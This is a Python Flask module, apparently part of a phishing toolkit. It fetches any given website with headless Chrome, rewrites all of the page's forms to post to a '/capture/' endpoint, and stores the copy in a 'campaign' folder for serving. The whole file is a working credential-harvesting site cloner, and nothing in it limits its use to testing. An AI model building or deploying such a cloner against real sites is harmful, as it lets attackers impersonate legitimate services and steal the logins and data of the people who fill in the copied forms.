from flask import Blueprint, request, jsonify, current_app
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os
import uuid
import time
from urllib.parse import urlparse

cloner_bp = Blueprint('cloner', __name__, url_prefix='/cloner')

def setup_selenium():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    return webdriver.Chrome(options=chrome_options)

@cloner_bp.route('/clone', methods=['POST'])
def clone_website():
    data = request.json
    if not data or 'url' not in data:
        return jsonify({'error': 'URL is required'}), 400
    
    try:
        # Setup Selenium
        driver = setup_selenium()
        driver.get(data['url'])
        
        # Wait for page to load
        time.sleep(3)
        
        # Get page source
        html = driver.page_source
        driver.quit()
        
        # Parse with BeautifulSoup
        soup = BeautifulSoup(html, 'html.parser')
        
        # Modify forms to point to our endpoint
        for form in soup.find_all('form'):
            form['action'] = f"/capture/{uuid.uuid4()}"
            form['method'] = "POST"
        
        # Generate unique campaign directory
        parsed_url = urlparse(data['url'])
        campaign_dir = os.path.join(
            current_app.config['CLONE_DIR'],
            f"{parsed_url.netloc}-{uuid.uuid4().hex[:8]}"
        )
        os.makedirs(campaign_dir, exist_ok=True)
        
        # Save cloned files
        index_path = os.path.join(campaign_dir, 'index.html')
        with open(index_path, 'w', encoding='utf-8') as f:
            f.write(str(soup))
            
        return jsonify({
            'success': True,
            'path': campaign_dir,
            'url': f"/clones/{os.path.basename(campaign_dir)}"
        })
        
    except Exception as e:
        current_app.logger.error(f"Cloning failed: {str(e)}")
        return jsonify({'error': str(e)}), 500